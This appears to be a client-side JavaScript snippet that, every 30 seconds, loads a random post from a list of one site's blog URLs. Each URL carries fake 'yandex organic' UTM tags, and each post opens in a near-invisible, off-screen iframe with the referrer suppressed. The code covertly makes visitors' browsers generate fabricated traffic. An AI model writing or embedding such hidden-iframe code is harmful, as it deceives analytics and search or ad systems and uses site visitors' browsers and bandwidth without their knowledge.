  const urls = [
    "https://www.skilllift.ru/2025/02/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/blog-post_72.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/2025.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/blog-post_88.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/vs.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/hr.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.skilllift.ru/2025/02/blog-post_16.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
